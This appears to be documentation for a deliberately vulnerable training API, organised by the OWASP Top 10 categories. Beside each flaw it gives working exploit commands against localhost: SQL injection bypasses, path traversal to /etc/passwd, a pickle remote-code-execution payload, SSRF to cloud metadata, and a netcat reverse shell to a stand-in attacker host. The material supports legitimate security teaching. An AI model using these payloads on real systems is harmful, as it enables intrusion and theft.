# Security Vulnerabilities Documentation

## ⚠️ INTENTIONALLY VULNERABLE APPLICATION

This API has been modified to contain **intentional security vulnerabilities** representing the **OWASP** for educational purposes, security testing, and code analysis demonstrations.

**DO NOT DEPLOY TO PRODUCTION!**

---

## OWASP Vulnerabilities Implemented

### Broken Access Control

**Description**: Missing authentication and authorization checks allow unauthorized access to sensitive operations.

**Affected Endpoints**:
- `PUT /products/{product_id}` - Any user can update any product
- `DELETE /products/{product_id}` - Any user can delete any product
- `PUT /inventory/{product_id}` - Unrestricted inventory modifications
- `GET /admin/*` - Admin endpoints accessible without authentication
- `GET /admin/read-file/` - Path traversal vulnerability
- `GET /users/list/` - Exposes all user data without authentication
- `GET /transactions/user/{user_name}` - IDOR - access to other users' transactions
- `GET /auth/reset-password/` - Password reset without verification

**Example Exploit**:
```bash
# Delete any product without authentication
curl -X DELETE http://localhost:8000/products/1

# Read sensitive files using path traversal
curl "http://localhost:8000/admin/read-file/?filepath=/etc/passwd"

# View other users' transactions
curl "http://localhost:8000/transactions/user/admin"
```

---

### Cryptographic Failures

**Description**: Sensitive data exposed without proper encryption or protection.

**Vulnerabilities**:
- Passwords stored in plain text (no hashing)
- Sensitive business data exposed in API responses
- Predictable session tokens
- Environment variables with secrets exposed
- Database credentials in plain text

**Affected Endpoints**:
- `GET /products/export/` - Exposes profit margins and internal costs
- `POST /auth/login/` - Returns plain text credentials
- `POST /auth/register/` - Stores passwords in plain text
- `GET /debug/env/` - Exposes all environment variables including secrets
- `GET /` - Exposes database connection strings

**Example Exploit**:
```bash
# Get sensitive business data
curl "http://localhost:8000/products/export/"

# View all environment variables (including API keys, secrets)
curl "http://localhost:8000/debug/env/"
```

---

### Injection

**Description**: Direct SQL and command injection vulnerabilities through unsanitized user input.

**Affected Endpoints**:
- `GET /products/search/` - SQL Injection in search query
- `GET /products/category/{category}` - SQL Injection in category filter
- `GET /transactions/user/{user_name}` - SQL Injection in username filter
- `POST /auth/login/` - SQL Injection in authentication
- `POST /auth/register/` - SQL Injection in registration
- `POST /inventory/adjust-by-query/` - Direct SQL injection
- `GET /admin/execute/` - Command Injection

**Example Exploits**:
```bash
# SQL Injection - Dump all products
curl "http://localhost:8000/products/category/electronics' OR '1'='1"

# SQL Injection - Authentication bypass
curl -X POST "http://localhost:8000/auth/login/?username=admin'--&password=anything"

# SQL Injection in search (data exfiltration)
curl "http://localhost:8000/products/search/?query=' UNION SELECT password,username,email,null,null,null,null FROM users--"

# Command Injection - Execute arbitrary commands
curl "http://localhost:8000/admin/execute/?cmd=cat%20/etc/passwd"

# Command Injection - Reverse shell (EXTREMELY DANGEROUS)
curl "http://localhost:8000/admin/execute/?cmd=nc%20-e%20/bin/bash%20attacker.com%204444"
```

---

### Insecure Design

**Description**: Missing security controls and dangerous functionality by design.

**Vulnerabilities**:
- No rate limiting on any endpoint (brute force attacks possible)
- Mass assignment allows modification of unintended fields
- Dangerous bulk operations without validation
- No business logic validation
- No CAPTCHA on sensitive operations

**Affected Endpoints**:
- `POST /products/bulk-update/` - Mass assignment vulnerability
- `POST /auth/login/` - No rate limiting (brute force)
- `POST /inventory/adjust-by-query/` - Dangerous custom SQL functionality
- All endpoints - No rate limiting

**Example Exploit**:
```bash
# Mass assignment - Modify internal fields
curl -X POST "http://localhost:8000/products/bulk-update/" \
  -H "Content-Type: application/json" \
  -d '{"products": [{"id": 1, "price": 0.01, "created_at": "2030-01-01"}]}'

# Brute force login (no rate limiting)
for i in {1..10000}; do
  curl -X POST "http://localhost:8000/auth/login/?username=admin&password=pass$i"
done
```

---

### Security Misconfiguration

**Description**: Insecure default configurations and exposed debug information.

**Vulnerabilities**:
- Debug mode enabled in production
- CORS allows all origins (`allow_origins=["*"]`)
- Verbose error messages with stack traces
- API documentation exposed at `/docs` and `/redoc`
- System information disclosed
- No security headers

**Affected Components**:
- Application startup - Debug mode: `debug=True`
- CORS Middleware - Allows all origins
- Error handlers - Expose internal details
- `GET /` - Exposes system information

**Example Issues**:
```python
# In main.py:
app = FastAPI(debug=True)  # Debug mode in production!

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],  # Allows ANY website to make requests
)
```

---

### Vulnerable and Outdated Components

**Description**: Use of inherently unsafe libraries and lack of dependency management.

**Vulnerabilities**:
- `pickle` module used for deserialization (inherently unsafe)
- No dependency pinning in `pyproject.toml`
- No security scanning of dependencies
- Potentially outdated packages

**Affected Endpoints**:
- `POST /admin/deserialize/` - Uses pickle for deserialization

**Example Exploit**:
```python
# Create malicious pickle payload for RCE
import pickle, base64, os

class Exploit:
    def __reduce__(self):
        return (os.system, ('whoami',))

payload = base64.b64encode(pickle.dumps(Exploit()))
print(payload.decode())

# Send to endpoint
# curl -X POST "http://localhost:8000/admin/deserialize/" -d "data=<payload>"
```

---

### Identification and Authentication Failures

**Description**: Weak authentication mechanisms and insecure session management.

**Vulnerabilities**:
- No password hashing (plain text storage)
- No password complexity requirements
- SQL injection in login
- Predictable session tokens (`username:role` format)
- No rate limiting on authentication attempts
- No account lockout mechanism
- No multi-factor authentication
- Password reset without email verification

**Affected Endpoints**:
- `POST /auth/login/` - Multiple authentication failures
- `POST /auth/register/` - No password requirements
- `GET /auth/reset-password/` - No verification required

**Example Exploits**:
```bash
# SQL Injection bypass authentication
curl -X POST "http://localhost:8000/auth/login/?username=admin'%20OR%20'1'='1'--&password=anything"

# Weak passwords accepted
curl -X POST "http://localhost:8000/auth/register/?username=test&password=1&email=test@test.com"

# Reset anyone's password without verification
curl "http://localhost:8000/auth/reset-password/?username=admin&new_password=hacked"

# Predictable token format (can be guessed)
# Token format: "username:role" - e.g., "admin:admin" or "user:user"
```

---

### Software and Data Integrity Failures

**Description**: No validation of data integrity and insecure deserialization.

**Vulnerabilities**:
- Insecure deserialization using `pickle`
- No input validation on critical fields
- No integrity checks on data modifications
- Mass assignment without field validation
- No checksums or signatures

**Affected Endpoints**:
- `POST /admin/deserialize/` - Arbitrary code execution via pickle
- `POST /products/bulk-update/` - No validation of updated data
- `PUT /products/{product_id}` - No input validation

**Example Exploit**:
```bash
# Mass assignment - modify protected fields
curl -X POST "http://localhost:8000/products/bulk-update/" \
  -H "Content-Type: application/json" \
  -d '{"products": [{"id": 1, "id": 999, "created_at": "1970-01-01"}]}'
```

---

### Security Logging and Monitoring Failures

**Description**: No logging of security events or monitoring of suspicious activity.

**Vulnerabilities**:
- No audit logs for authentication attempts
- No logging of data access or modifications
- No monitoring of suspicious patterns
- No alerting on security events
- No log retention policy
- Failed login attempts not tracked

**Affected Areas**:
- All endpoints - No security logging
- No centralized logging
- No SIEM integration
- No intrusion detection

---

### Server-Side Request Forgery (SSRF)

**Description**: Unrestricted URL fetching allows access to internal services.

**Affected Endpoints**:
- `GET /admin/fetch-url/` - Fetches content from any URL

**Vulnerabilities**:
- No URL validation or allowlist
- Can access internal services (localhost, 127.0.0.1, internal IPs)
- Can scan internal networks
- Can access cloud metadata services

**Example Exploits**:
```bash
# Access internal services
curl "http://localhost:8000/admin/fetch-url/?url=http://localhost:8080/admin"

# Access cloud metadata (AWS)
curl "http://localhost:8000/admin/fetch-url/?url=http://169.254.169.254/latest/meta-data/"

# Port scanning
for port in {20..100}; do
  curl "http://localhost:8000/admin/fetch-url/?url=http://localhost:$port"
done

# Access internal APIs
curl "http://localhost:8000/admin/fetch-url/?url=http://internal-api.local/secrets"
```

---

**Never deploy this code to a production environment or publicly accessible server.**
